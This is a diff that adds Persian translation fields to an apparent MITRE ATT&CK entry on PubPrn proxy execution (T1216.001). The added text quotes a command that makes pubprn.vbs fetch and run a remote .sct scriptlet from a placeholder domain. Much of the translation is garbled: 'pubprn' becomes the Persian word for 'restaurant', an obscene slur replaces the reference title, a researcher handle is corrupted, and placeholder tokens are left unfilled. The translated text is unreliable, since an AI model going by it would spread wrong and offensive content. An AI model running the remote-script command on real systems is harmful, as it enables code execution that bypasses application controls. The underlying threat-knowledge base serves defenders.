@@ -13,17 +13,22 @@
                 {
                     "source_name": "mitre-attack",
                     "url": "https://attack.mitre.org/techniques/T1216/001",
-                    "external_id": "T1216.001"
+                    "external_id": "T1216.001",
+                    "source_name_fa": "حمله mitre"
                 },
                 {
                     "source_name": "pubprn",
                     "description": "Jason Gerend. (2017, October 16). pubprn. Retrieved July 23, 2021.",
-                    "url": "https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/pubprn"
+                    "url": "https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/pubprn",
+                    "source_name_fa": "رستوران",
+                    "description_fa": "جیسون Gerend (2017، 16 اکتبر) فاحشه Retrieved 23 July 2021."
                 },
                 {
                     "source_name": "Enigma0x3 PubPrn Bypass",
                     "description": "Nelson, M. (2017, August 3). WSH INJECTION: A CASE STUDY. Retrieved April 9, 2018.",
-                    "url": "https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/"
+                    "url": "https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/",
+                    "source_name_fa": "NZ0x3 PubPrn Bypass",
+                    "description_fa": "نلسون، M. (2017، 3 آگوست) WSH INJECTION: A CASE STUDY Retrieved 9 آوریل 2018"
                 }
             ],
             "object_marking_refs": [
@@ -51,7 +56,9 @@
             "x_mitre_platforms": [
                 "Windows"
             ],
-            "x_mitre_version": "3.0"
+            "x_mitre_version": "3.0",
+            "name_fa": "PubPrn",
+            "description_fa": "مخالفان ممکن است از PubPrn به اجرای پروکسی فایل های از راه دور مخرب استفاده کنند. PubPrn.vbs یک اسکریپت [Visual Basic] است ([CTI_PRESERVE_9] که یک چاپگر را برای خدمات Active Directory منتشر می کند. این کتاب ممکن است توسط مایکروسافت امضا شود و به طور معمول از طریق [Windows Command Shell] اجرا می شود ([CTI_PRESERVE_10] از طریق [CTI_PRESERVE_0]. به عنوان مثال، کد زیر یک چاپگر را در دامنه مشخص منتشر می کند: [[ویرایش]\n\nمجرمان ممکن است از PubPrn برای اجرای محموله های مخرب میزبانی شده در سایت های از راه دور استفاده کنند. [CTI_PRESERVE_8] برای انجام این کار، ممکن است پارامتر دوم [CTI_PRESERVE_2] را برای اشاره به یک فایل اسکریپت (.sct) میزبانی شده در یک سایت از راه دور تنظیم کند. در این میان، فرمانی است که از آن استفاده می شود. این رفتار ممکن است محدودیت های اعتباری امضا و راه حل های کنترل برنامه را که برای سوء استفاده از این اسکریپت حساب نمی کنند، دور بزند.\n\nدر نسخه های بعدی ویندوز (10+)، [[CTI_PRESERVE_4] برای جلوگیری از اجرای پروکسی از یک سایت از راه دور به روز شده است. این کار با محدود کردن پروتکل مشخص شده در پارامتر دوم انجام می شود تا [CTI_PRESERVE_5]، معاون [CTI_PRESERVE_6] moniker که می تواند برای اشاره به کد از راه دور از طریق HTTP (S) استفاده شود. <code>Cscript.exe</code> <code>cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com</code> <code>script:</code> <code>pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct</code> <code>PubPrn.vbs</code> <code>LDAP://</code> <code>script:</code> (Citation: pubprn) (Citation: Enigma0x3 PubPrn Bypass) https://attack.mitre.org/techniques/T1059/005 https://attack.mitre.org/techniques/T1059/003"
         }
     ]
 }
